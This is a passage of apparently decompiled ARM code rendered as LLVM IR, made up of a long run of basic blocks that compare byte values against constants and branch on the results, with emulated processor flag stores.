  %v2_fb58 = icmp ugt i32 %v1_e8d4, 50
  store i1 %v2_fb58, i1* %cpsr_c.global-to-local, align 1
  %v7_fb58 = icmp eq i32 %v1_e8d4, 51
  %.2032 = zext i1 %v7_fb58 to i32
  store i32 %.2032, i32* @r7, align 4
  %v2_fb64 = and i32 %storemerge1237, %.2032
  %v4_fb64 = icmp eq i32 %v2_fb64, 0
  store i1 %v4_fb64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fb64, label %dec_label_pc_fb6c, label %dec_label_pc_e8d0

dec_label_pc_fb6c:                                ; preds = %dec_label_pc_fb54
  %v2_fb6c = icmp eq i32 %v1_e8e8, 255
  store i1 %v2_fb6c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb6c, label %.thread465, label %.thread466

.thread466:                                       ; preds = %dec_label_pc_fb6c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb80

.thread465:                                       ; preds = %dec_label_pc_fb6c
  store i32 %.2032, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb78 = icmp eq i1 %v7_fb58, false
  store i1 %v2_fb78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb78, label %dec_label_pc_fb80, label %dec_label_pc_e8d0

dec_label_pc_fb80:                                ; preds = %.thread466, %.thread465
  %v7_fb80 = icmp eq i32 %v1_e8d4, 5
  %.2033 = zext i1 %v7_fb80 to i32
  store i32 %.2033, i32* %r3.global-to-local, align 4
  %v2_fb8c = icmp ugt i32 %v1_e8e8, 134
  store i1 %v2_fb8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb8c = icmp eq i32 %v1_e8e8, 135
  store i1 %v7_fb8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb8c, label %bb1781, label %dec_label_pc_fb98

bb1781:                                           ; preds = %dec_label_pc_fb80
  %v2_fb80 = icmp ugt i32 %v1_e8d4, 4
  store i1 %v2_fb80, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fb80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb80, label %dec_label_pc_e8d0, label %dec_label_pc_fb98

dec_label_pc_fb98:                                ; preds = %dec_label_pc_fb80, %bb1781
  %v2_fb9c = and i32 %.1984, %.2033
  %v4_fb9c = icmp eq i32 %v2_fb9c, 0
  store i1 %v4_fb9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fb9c, label %dec_label_pc_fba4, label %dec_label_pc_e8d0

dec_label_pc_fba4:                                ; preds = %dec_label_pc_fb98
  store i1 %v2_ee80, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ee80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee80, label %.thread471, label %.thread472

.thread472:                                       ; preds = %dec_label_pc_fba4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fbb8

.thread471:                                       ; preds = %dec_label_pc_fba4
  store i32 %.2033, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbb0 = icmp eq i1 %v7_fb80, false
  store i1 %v2_fbb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fbb0, label %dec_label_pc_fbb8, label %dec_label_pc_e8d0

dec_label_pc_fbb8:                                ; preds = %.thread472, %.thread471
  %v2_fbb8 = icmp ugt i32 %v1_e8d4, 90
  store i1 %v2_fbb8, i1* %cpsr_c.global-to-local, align 1
  %v7_fbb8 = icmp eq i32 %v1_e8d4, 91
  store i1 %v7_fbb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbb8, label %bb1782, label %dec_label_pc_fbc4

bb1782:                                           ; preds = %dec_label_pc_fbb8
  %v3_fbbc = icmp ugt i32 %v1_e8e8, 133
  store i1 %v3_fbbc, i1* %cpsr_c.global-to-local, align 1
  %v8_fbbc = icmp eq i32 %v1_e8e8, 134
  store i1 %v8_fbbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fbbc, label %dec_label_pc_e8d0, label %dec_label_pc_fbc4

dec_label_pc_fbc4:                                ; preds = %dec_label_pc_fbb8, %bb1782
  store i32 %.2017, i32* %r3.global-to-local, align 4
  %v2_fbc8 = icmp ugt i32 %v1_e8e8, 199
  store i1 %v2_fbc8, i1* %cpsr_c.global-to-local, align 1
  %v7_fbc8 = icmp eq i32 %v1_e8e8, 200
  store i1 %v7_fbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbc8, label %.thread476, label %.thread477

.thread477:                                       ; preds = %dec_label_pc_fbc4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fbf0

.thread476:                                       ; preds = %dec_label_pc_fbc4
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbd4 = icmp eq i1 %v7_f32c, false
  store i1 %v2_fbd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fbd4, label %dec_label_pc_fbf0, label %dec_label_pc_fbdc

dec_label_pc_fbdc:                                ; preds = %.thread476
  %v2_fbdc = icmp ugt i32 %v1_e8ec, 157
  store i1 %v2_fbdc, i1* %cpsr_c.global-to-local, align 1
  %v7_fbdc = icmp eq i32 %v1_e8ec, 158
  store i1 %v7_fbdc, i1* %cpsr_z.global-to-local, align 1
  %v2_fbe0 = xor i1 %v7_fbdc, true
  %v3_fbe0 = and i1 %v2_fbdc, %v2_fbe0
  br i1 %v3_fbe0, label %bb1783, label %bb1784

bb1783:                                           ; preds = %dec_label_pc_fbdc
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1784

bb1784:                                           ; preds = %dec_label_pc_fbdc, %bb1783
  %v0_fbe8996 = phi i32 [ %.2017, %dec_label_pc_fbdc ], [ 0, %bb1783 ]
  %v2_fbe4 = xor i1 %v2_fbdc, true
  %v3_fbe4 = or i1 %v7_fbdc, %v2_fbe4
  br i1 %v3_fbe4, label %bb1785, label %bb1786

bb1785:                                           ; preds = %bb1784
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1786

bb1786:                                           ; preds = %bb1784, %bb1785
  %v0_fbe8 = phi i32 [ %v0_fbe8996, %bb1784 ], [ 1, %bb1785 ]
  %v2_fbe8 = and i32 %v3_e8dc, 64
  %v3_fbe8 = icmp ne i32 %v2_fbe8, 0
  store i1 %v3_fbe8, i1* %cpsr_c.global-to-local, align 1
  %v4_fbe8 = udiv i32 %v1_e8ec, 128
  %v5_fbe8 = and i32 %v0_fbe8, %v4_fbe8
  store i32 %v5_fbe8, i32* %r3.global-to-local, align 4
  %v6_fbe8 = icmp eq i32 %v5_fbe8, 0
  store i1 %v6_fbe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_fbe8, label %dec_label_pc_fbf0, label %dec_label_pc_e8d0

dec_label_pc_fbf0:                                ; preds = %.thread477, %bb1786, %.thread476
  store i32 %.2021, i32* %r3.global-to-local, align 4
  %v2_fbf4 = icmp ugt i32 %v1_e8e8, 151
  store i1 %v2_fbf4, i1* %cpsr_c.global-to-local, align 1
  %v7_fbf4 = icmp eq i32 %v1_e8e8, 152
  store i1 %v7_fbf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbf4, label %.thread480, label %.thread481

.thread481:                                       ; preds = %dec_label_pc_fbf0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc24

.thread480:                                       ; preds = %dec_label_pc_fbf0
  store i32 %.2021, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc00 = icmp eq i1 %v7_f420, false
  store i1 %v2_fc00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc00, label %dec_label_pc_fc24, label %dec_label_pc_fc08

dec_label_pc_fc08:                                ; preds = %.thread480
  %v2_fc08 = icmp ugt i32 %v1_e8ec, 94
  store i1 %v2_fc08, i1* %cpsr_c.global-to-local, align 1
  %v7_fc08 = icmp eq i32 %v1_e8ec, 95
  store i1 %v7_fc08, i1* %cpsr_z.global-to-local, align 1
  %v2_fc0c = xor i1 %v2_fc08, true
  %v3_fc0c = or i1 %v7_fc08, %v2_fc0c
  br i1 %v3_fc0c, label %bb1787, label %bb1788

bb1787:                                           ; preds = %dec_label_pc_fc08
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1788

bb1788:                                           ; preds = %dec_label_pc_fc08, %bb1787
  %v0_fc1c.pr999 = phi i32 [ %.2021, %dec_label_pc_fc08 ], [ 0, %bb1787 ]
  %v2_fc10 = xor i1 %v7_fc08, true
  %v3_fc10 = and i1 %v2_fc08, %v2_fc10
  br i1 %v3_fc10, label %bb1789, label %bb1790

bb1789:                                           ; preds = %bb1788
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1790

bb1790:                                           ; preds = %bb1788, %bb1789
  %v0_fc1c.pr = phi i32 [ %v0_fc1c.pr999, %bb1788 ], [ 1, %bb1789 ]
  %v2_fc14 = icmp ugt i32 %v1_e8ec, 109
  store i1 %v2_fc14, i1* %cpsr_c.global-to-local, align 1
  %v7_fc14 = icmp eq i32 %v1_e8ec, 110
  store i1 %v7_fc14, i1* %cpsr_z.global-to-local, align 1
  %v2_fc18 = xor i1 %v7_fc14, true
  %v3_fc18 = and i1 %v2_fc14, %v2_fc18
  br i1 %v3_fc18, label %.thread485, label %bb1791

.thread485:                                       ; preds = %bb1790
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc24

bb1791:                                           ; preds = %bb1790
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc1c = icmp eq i32 %v0_fc1c.pr, 0
  store i1 %v2_fc1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc1c, label %dec_label_pc_fc24, label %dec_label_pc_e8d0

dec_label_pc_fc24:                                ; preds = %.thread485, %.thread481, %bb1791, %.thread480
  store i32 %.2021, i32* %r3.global-to-local, align 4
  %v2_fc28 = icmp ugt i32 %v1_e8e8, 180
  store i1 %v2_fc28, i1* %cpsr_c.global-to-local, align 1
  %v7_fc28 = icmp eq i32 %v1_e8e8, 181
  store i1 %v7_fc28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc28, label %.thread488, label %.thread489

.thread489:                                       ; preds = %dec_label_pc_fc24
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc58

.thread488:                                       ; preds = %dec_label_pc_fc24
  store i32 %.2021, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc34 = icmp eq i1 %v7_f420, false
  store i1 %v2_fc34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc34, label %dec_label_pc_fc58, label %dec_label_pc_fc3c

dec_label_pc_fc3c:                                ; preds = %.thread488
  %v2_fc3c = icmp ugt i32 %v1_e8ec, 158
  store i1 %v2_fc3c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc3c = icmp eq i32 %v1_e8ec, 159
  store i1 %v7_fc3c, i1* %cpsr_z.global-to-local, align 1
  %v2_fc40 = xor i1 %v2_fc3c, true
  %v3_fc40 = or i1 %v7_fc3c, %v2_fc40
  br i1 %v3_fc40, label %bb1792, label %bb1793

bb1792:                                           ; preds = %dec_label_pc_fc3c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1793

bb1793:                                           ; preds = %dec_label_pc_fc3c, %bb1792
  %v0_fc50.pr1002 = phi i32 [ %.2021, %dec_label_pc_fc3c ], [ 0, %bb1792 ]
  %v2_fc44 = xor i1 %v7_fc3c, true
  %v3_fc44 = and i1 %v2_fc3c, %v2_fc44
  br i1 %v3_fc44, label %bb1794, label %bb1795

bb1794:                                           ; preds = %bb1793
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1795

bb1795:                                           ; preds = %bb1793, %bb1794
  %v0_fc50.pr = phi i32 [ %v0_fc50.pr1002, %bb1793 ], [ 1, %bb1794 ]
  %v2_fc48 = icmp ugt i32 %v1_e8ec, 187
  store i1 %v2_fc48, i1* %cpsr_c.global-to-local, align 1
  %v7_fc48 = icmp eq i32 %v1_e8ec, 188
  store i1 %v7_fc48, i1* %cpsr_z.global-to-local, align 1
  %v2_fc4c = xor i1 %v7_fc48, true
  %v3_fc4c = and i1 %v2_fc48, %v2_fc4c
  br i1 %v3_fc4c, label %.thread493, label %bb1796

.thread493:                                       ; preds = %bb1795
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc58

bb1796:                                           ; preds = %bb1795
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc50 = icmp eq i32 %v0_fc50.pr, 0
  store i1 %v2_fc50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc50, label %dec_label_pc_fc58, label %dec_label_pc_e8d0

dec_label_pc_fc58:                                ; preds = %.thread493, %.thread489, %bb1796, %.thread488
  store i32 %.2002, i32* %r3.global-to-local, align 4
  %v2_fc5c = and i32 %.1978, %.2002
  %v4_fc5c = icmp eq i32 %v2_fc5c, 0
  store i1 %v4_fc5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fc5c, label %dec_label_pc_fc80, label %dec_label_pc_fc64

dec_label_pc_fc64:                                ; preds = %dec_label_pc_fc58
  %v2_fc64 = icmp ugt i32 %v1_e8ec, 62
  store i1 %v2_fc64, i1* %cpsr_c.global-to-local, align 1
  %v7_fc64 = icmp eq i32 %v1_e8ec, 63
  store i1 %v7_fc64, i1* %cpsr_z.global-to-local, align 1
  %v2_fc68 = xor i1 %v2_fc64, true
  %v3_fc68 = or i1 %v7_fc64, %v2_fc68
  br i1 %v3_fc68, label %bb1797, label %bb1798

bb1797:                                           ; preds = %dec_label_pc_fc64
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1798

bb1798:                                           ; preds = %dec_label_pc_fc64, %bb1797
  %v0_fc78.pr1004 = phi i32 [ %.2002, %dec_label_pc_fc64 ], [ 0, %bb1797 ]
  %v2_fc6c = xor i1 %v7_fc64, true
  %v3_fc6c = and i1 %v2_fc64, %v2_fc6c
  br i1 %v3_fc6c, label %bb1799, label %bb1800

bb1799:                                           ; preds = %bb1798
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1800

bb1800:                                           ; preds = %bb1798, %bb1799
  %v0_fc78.pr = phi i32 [ %v0_fc78.pr1004, %bb1798 ], [ 1, %bb1799 ]
  %v2_fc70 = icmp ugt i32 %v1_e8ec, 93
  store i1 %v2_fc70, i1* %cpsr_c.global-to-local, align 1
  %v7_fc70 = icmp eq i32 %v1_e8ec, 94
  store i1 %v7_fc70, i1* %cpsr_z.global-to-local, align 1
  %v2_fc74 = xor i1 %v7_fc70, true
  %v3_fc74 = and i1 %v2_fc70, %v2_fc74
  br i1 %v3_fc74, label %.thread497, label %bb1801

.thread497:                                       ; preds = %bb1800
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fc80

bb1801:                                           ; preds = %bb1800
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc78 = icmp eq i32 %v0_fc78.pr, 0
  store i1 %v2_fc78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc78, label %dec_label_pc_fc80, label %dec_label_pc_e8d0

dec_label_pc_fc80:                                ; preds = %.thread497, %bb1801, %dec_label_pc_fc58
  store i32 %storemerge1257, i32* %r3.global-to-local, align 4
  %v2_fc84 = icmp ugt i32 %v1_e8d4, 183
  store i1 %v2_fc84, i1* %cpsr_c.global-to-local, align 1
  %v7_fc84 = icmp eq i32 %v1_e8d4, 184
  store i1 %v7_fc84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc84, label %.thread500, label %.thread501

.thread501:                                       ; preds = %dec_label_pc_fc80
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fca4

.thread500:                                       ; preds = %dec_label_pc_fc80
  store i32 %storemerge1257, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc90 = icmp eq i1 %v7_f42c, false
  store i1 %v2_fc90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc90, label %dec_label_pc_fca4, label %dec_label_pc_fc98

dec_label_pc_fc98:                                ; preds = %.thread500
  %v2_fc98 = icmp eq i32 %v1_e8ec, 255
  store i1 %v2_fc98, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fc98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc98, label %dec_label_pc_fca4, label %bb1802

bb1802:                                           ; preds = %dec_label_pc_fc98
  %v3_fc9c = icmp ugt i32 %v1_e8ec, 238
  store i1 %v3_fc9c, i1* %cpsr_c.global-to-local, align 1
  %v8_fc9c = icmp eq i32 %v1_e8ec, 239
  store i1 %v8_fc9c, i1* %cpsr_z.global-to-local, align 1
  %v2_fca0 = xor i1 %v8_fc9c, true
  %v3_fca0 = and i1 %v3_fc9c, %v2_fca0
  br i1 %v3_fca0, label %dec_label_pc_e8d0, label %dec_label_pc_fca4

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc98, %.thread501, %bb1802, %.thread500
  %v2_fca4 = icmp ugt i32 %v1_e8e8, 110
  store i1 %v2_fca4, i1* %cpsr_c.global-to-local, align 1
  %v7_fca4 = icmp eq i32 %v1_e8e8, 111
  store i1 %v7_fca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fca4, label %.thread504, label %.thread505

.thread505:                                       ; preds = %dec_label_pc_fca4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fccc

.thread504:                                       ; preds = %dec_label_pc_fca4
  store i32 %.1975, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fcb0 = icmp eq i1 %v7_e978, false
  store i1 %v2_fcb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fcb0, label %dec_label_pc_fccc, label %dec_label_pc_fcb8

dec_label_pc_fcb8:                                ; preds = %.thread504
  %v2_fcb8 = icmp ugt i32 %v1_e8ec, 141
  store i1 %v2_fcb8, i1* %cpsr_c.global-to-local, align 1
  %v7_fcb8 = icmp eq i32 %v1_e8ec, 142
  store i1 %v7_fcb8, i1* %cpsr_z.global-to-local, align 1
  %v2_fcbc = xor i1 %v7_fcb8, true
  %v3_fcbc = and i1 %v2_fcb8, %v2_fcbc
  br i1 %v3_fcbc, label %bb1803, label %bb1804

bb1803:                                           ; preds = %dec_label_pc_fcb8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1804

bb1804:                                           ; preds = %dec_label_pc_fcb8, %bb1803
  %v0_fcc41009 = phi i32 [ %.1975, %dec_label_pc_fcb8 ], [ 0, %bb1803 ]
  %v2_fcc0 = xor i1 %v2_fcb8, true
  %v3_fcc0 = or i1 %v7_fcb8, %v2_fcc0
  br i1 %v3_fcc0, label %bb1805, label %bb1806

bb1805:                                           ; preds = %bb1804
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1806

bb1806:                                           ; preds = %bb1804, %bb1805
  %v0_fcc4 = phi i32 [ %v0_fcc41009, %bb1804 ], [ 1, %bb1805 ]
  %v2_fcc4 = and i32 %v3_e8dc, 64
  %v3_fcc4 = icmp ne i32 %v2_fcc4, 0
  store i1 %v3_fcc4, i1* %cpsr_c.global-to-local, align 1
  %v4_fcc4 = udiv i32 %v1_e8ec, 128
  %v5_fcc4 = and i32 %v0_fcc4, %v4_fcc4
  store i32 %v5_fcc4, i32* %r3.global-to-local, align 4
  %v6_fcc4 = icmp eq i32 %v5_fcc4, 0
  store i1 %v6_fcc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_fcc4, label %dec_label_pc_fccc, label %dec_label_pc_e8d0

dec_label_pc_fccc:                                ; preds = %.thread505, %bb1806, %.thread504
  %v2_fccc = icmp ugt i32 %v1_e8e8, 251
  store i1 %v2_fccc, i1* %cpsr_c.global-to-local, align 1
  %v7_fccc = icmp eq i32 %v1_e8e8, 252
  store i1 %v7_fccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fccc, label %.thread508, label %.thread509

.thread509:                                       ; preds = %dec_label_pc_fccc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fcfc

.thread508:                                       ; preds = %dec_label_pc_fccc
  store i32 %.1975, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fcd8 = icmp eq i1 %v7_e978, false
  store i1 %v2_fcd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fcd8, label %dec_label_pc_fcfc, label %dec_label_pc_fce0

dec_label_pc_fce0:                                ; preds = %.thread508
  %v2_fce0 = icmp ugt i32 %v1_e8ec, 206
  store i1 %v2_fce0, i1* %cpsr_c.global-to-local, align 1
  %v7_fce0 = icmp eq i32 %v1_e8ec, 207
  store i1 %v7_fce0, i1* %cpsr_z.global-to-local, align 1
  %v2_fce4 = xor i1 %v2_fce0, true
  %v3_fce4 = or i1 %v7_fce0, %v2_fce4
  br i1 %v3_fce4, label %bb1807, label %bb1808

bb1807:                                           ; preds = %dec_label_pc_fce0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1808

bb1808:                                           ; preds = %dec_label_pc_fce0, %bb1807
  %v0_fcf4.pr1011 = phi i32 [ %.1975, %dec_label_pc_fce0 ], [ 0, %bb1807 ]
  %v2_fce8 = xor i1 %v7_fce0, true
  %v3_fce8 = and i1 %v2_fce0, %v2_fce8
  br i1 %v3_fce8, label %bb1809, label %bb1810

bb1809:                                           ; preds = %bb1808
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1810

bb1810:                                           ; preds = %bb1808, %bb1809
  %v0_fcf4.pr = phi i32 [ %v0_fcf4.pr1011, %bb1808 ], [ 1, %bb1809 ]
  %v2_fcec = icmp ugt i32 %v1_e8ec, 221
  store i1 %v2_fcec, i1* %cpsr_c.global-to-local, align 1
  %v7_fcec = icmp eq i32 %v1_e8ec, 222
  store i1 %v7_fcec, i1* %cpsr_z.global-to-local, align 1
  %v2_fcf0 = xor i1 %v7_fcec, true
  %v3_fcf0 = and i1 %v2_fcec, %v2_fcf0
  br i1 %v3_fcf0, label %.thread513, label %bb1811

.thread513:                                       ; preds = %bb1810
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fcfc

bb1811:                                           ; preds = %bb1810
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fcf4 = icmp eq i32 %v0_fcf4.pr, 0
  store i1 %v2_fcf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fcf4, label %dec_label_pc_fcfc, label %dec_label_pc_e8d0

dec_label_pc_fcfc:                                ; preds = %.thread513, %.thread509, %bb1811, %.thread508
  %v2_fcfc = icmp ugt i32 %v1_e8e8, 39
  store i1 %v2_fcfc, i1* %cpsr_c.global-to-local, align 1
  %v7_fcfc = icmp eq i32 %v1_e8e8, 40
  store i1 %v7_fcfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcfc, label %.thread516, label %.thread517

.thread517:                                       ; preds = %dec_label_pc_fcfc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fd2c

.thread516:                                       ; preds = %dec_label_pc_fcfc
  store i32 %.1975, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd08 = icmp eq i1 %v7_e978, false
  store i1 %v2_fd08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd08, label %dec_label_pc_fd2c, label %dec_label_pc_fd10

dec_label_pc_fd10:                                ; preds = %.thread516
  %v2_fd10 = icmp ugt i32 %v1_e8ec, 54
  store i1 %v2_fd10, i1* %cpsr_c.global-to-local, align 1
  %v7_fd10 = icmp eq i32 %v1_e8ec, 55
  store i1 %v7_fd10, i1* %cpsr_z.global-to-local, align 1
  %v2_fd14 = xor i1 %v2_fd10, true
  %v3_fd14 = or i1 %v7_fd10, %v2_fd14
  br i1 %v3_fd14, label %bb1812, label %bb1813

bb1812:                                           ; preds = %dec_label_pc_fd10
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1813

bb1813:                                           ; preds = %dec_label_pc_fd10, %bb1812
  %v0_fd24.pr1013 = phi i32 [ %.1975, %dec_label_pc_fd10 ], [ 0, %bb1812 ]
  %v2_fd18 = xor i1 %v7_fd10, true
  %v3_fd18 = and i1 %v2_fd10, %v2_fd18
  br i1 %v3_fd18, label %bb1814, label %bb1815

bb1814:                                           ; preds = %bb1813
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1815

bb1815:                                           ; preds = %bb1813, %bb1814
  %v0_fd24.pr = phi i32 [ %v0_fd24.pr1013, %bb1813 ], [ 1, %bb1814 ]
  %v2_fd1c = icmp ugt i32 %v1_e8ec, 57
  store i1 %v2_fd1c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd1c = icmp eq i32 %v1_e8ec, 58
  store i1 %v7_fd1c, i1* %cpsr_z.global-to-local, align 1
  %v2_fd20 = xor i1 %v7_fd1c, true
  %v3_fd20 = and i1 %v2_fd1c, %v2_fd20
  br i1 %v3_fd20, label %.thread521, label %bb1816

.thread521:                                       ; preds = %bb1815
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fd2c

bb1816:                                           ; preds = %bb1815
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd24 = icmp eq i32 %v0_fd24.pr, 0
  store i1 %v2_fd24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd24, label %dec_label_pc_fd2c, label %dec_label_pc_e8d0

dec_label_pc_fd2c:                                ; preds = %.thread521, %.thread517, %bb1816, %.thread516
  store i32 %.2004, i32* %r3.global-to-local, align 4
  %v2_fd30 = icmp ugt i32 %v1_e8e8, 7
  store i1 %v2_fd30, i1* %cpsr_c.global-to-local, align 1
  %v7_fd30 = icmp eq i32 %v1_e8e8, 8
  store i1 %v7_fd30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd30, label %.thread524, label %.thread525

.thread525:                                       ; preds = %dec_label_pc_fd2c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fd60

.thread524:                                       ; preds = %dec_label_pc_fd2c
  store i32 %.2004, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd3c = icmp eq i1 %v7_edd4, false
  store i1 %v2_fd3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fd3c, label %dec_label_pc_fd60, label %dec_label_pc_fd44

dec_label_pc_fd44:                                ; preds = %.thread524
  %v2_fd44 = icmp ugt i32 %v1_e8ec, 79
  store i1 %v2_fd44, i1* %cpsr_c.global-to-local, align 1
  %v7_fd44 = icmp eq i32 %v1_e8ec, 80
  store i1 %v7_fd44, i1* %cpsr_z.global-to-local, align 1
  %v2_fd48 = xor i1 %v2_fd44, true
  %v3_fd48 = or i1 %v7_fd44, %v2_fd48
  br i1 %v3_fd48, label %bb1817, label %bb1818

bb1817:                                           ; preds = %dec_label_pc_fd44
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1818

bb1818:                                           ; preds = %dec_label_pc_fd44, %bb1817
  %v0_fd58.pr1016 = phi i32 [ %.2004, %dec_label_pc_fd44 ], [ 0, %bb1817 ]
  %v2_fd4c = xor i1 %v7_fd44, true
  %v3_fd4c = and i1 %v2_fd44, %v2_fd4c
  br i1 %v3_fd4c, label %bb1819, label %bb1820

bb1819:                                           ; preds = %bb1818
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1820

bb1820:                                           ; preds = %bb1818, %bb1819
  %v0_fd58.pr = phi i32 [ %v0_fd58.pr1016, %bb1818 ], [ 1, %bb1819 ]
  %v2_fd50 = icmp ugt i32 %v1_e8ec, 93
  store i1 %v2_fd50, i1* %cpsr_c.global-to-local, align 1
  %v7_fd50 = icmp eq i32 %v1_e8ec, 94
  store i1 %v7_fd50, i1* %cpsr_z.global-to-local, align 1
